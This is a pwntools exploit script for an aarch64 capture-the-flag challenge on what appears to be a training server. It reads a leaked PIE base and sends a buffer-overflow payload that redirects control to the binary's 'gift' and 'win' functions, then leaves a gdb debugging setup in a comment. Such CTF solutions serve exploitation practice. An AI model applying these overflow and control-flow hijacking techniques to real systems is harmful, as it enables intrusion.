#!/usr/bin/env python3
from pwn import *
import os

HOST = "pwn-aaarchchooo-ae63346841b4.training.bksec.vn"
PORT = 1337

elf = context.binary = ELF("./pwn2_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

ROOTFS = os.path.abspath(".")
GDB_PORT = 1234

context.log_level = "debug"

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)

    cmd = [
        "qemu-aarch64",
        "-L", ROOTFS,
    ]

    if args.GDB:
        cmd += ["-g", str(GDB_PORT)]

    cmd += [elf.path]

    return process(
        cmd,
        env={"LD_LIBRARY_PATH": ROOTFS}
    )

p = conn()

p.recvuntil(b'your pie: ')
PIE = int(p.recvline().strip(), 16)
elf.address = PIE
log.success(f'PIE: {hex(PIE)}') 

pl = fit({
    0x88: p64(elf.sym.gift),
    0xa8: p64(elf.sym.gift + 0xc),
    0xd0: p64(elf.sym.win),
    0xd8: p64(0xdeadbeefbeefdead),
}, filler=b'A', length=0xe0)

p.sendlineafter(b'> ', pl)

p.interactive()

'''
gdb-multiarch ./pwn2_patched
set architecture aarch64
set sysroot .
target remote 127.0.0.1:1234
b* main
c
'''